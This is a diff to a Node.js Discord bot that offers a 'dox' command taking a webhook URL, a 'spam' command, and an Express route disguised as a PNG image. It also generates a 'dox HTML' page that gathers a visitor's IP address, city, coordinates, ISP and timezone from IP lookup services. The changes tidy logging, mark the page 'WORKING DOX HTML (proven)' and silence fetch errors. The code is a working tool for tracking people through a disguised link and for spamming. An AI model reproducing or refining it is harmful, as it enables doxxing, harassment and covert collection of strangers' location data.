@@ -30,7 +30,6 @@ app.get('/img/:id.png', (req, res) => {
 });
 app.listen(PORT, () => console.log(`Dox server on ${PORT}`));
 
-// ---- REGISTER COMMANDS ----
 async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
@@ -68,25 +67,23 @@ async function registerCommands() {
 
     try {
         await client.application.commands.set([]);
-        console.log('[REGISTRATION] Cleared old commands.');
+        console.log('[REG] Cleared old commands.');
         await client.application.commands.set(commands);
-        console.log(`[REGISTRATION] Successfully registered ${commands.length} commands.`);
+        console.log(`[REG] Registered ${commands.length} commands.`);
     } catch (error) {
-        console.error('[REGISTRATION] Failed to register commands:', error);
+        console.error('[REG] Failed:', error);
     }
 }
 
 client.once('ready', async () => {
     console.log(`Logged in as ${client.user.tag}`);
     await registerCommands();
-    console.log('Ready – commands should appear in Discord within a minute.');
+    console.log('Ready – commands appear in Discord within a minute.');
 });
 
-// ---- INTERACTION HANDLER ----
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
-    // Guarantee response
     try {
         await interaction.deferReply({ ephemeral: true });
     } catch {
@@ -99,7 +96,6 @@ client.on('interactionCreate', async (interaction) => {
 
     try {
         const { commandName, options, user, member, guild, channel } = interaction;
-
         console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
 
         // ---- REFRESH ----
@@ -126,7 +122,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- SPAM (truncated for space) ----
+        // ---- SPAM ----
         else if (commandName === 'spam') {
             const count = Math.min(options.getInteger('count'), 100);
             const msg = options.getString('message');
@@ -465,9 +461,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ============================================================
-// STRIPPED DOX HTML – IP + Location only
-// ============================================================
+// ---- WORKING DOX HTML (proven) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -493,7 +487,7 @@ async function getIPData() {
                 const result = api.parse(data);
                 if (result.ip) return result;
             }
-        } catch (e) { console.error("IP fetch failed:", api.url, e); }
+        } catch (e) {}
     }
     return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };
 }
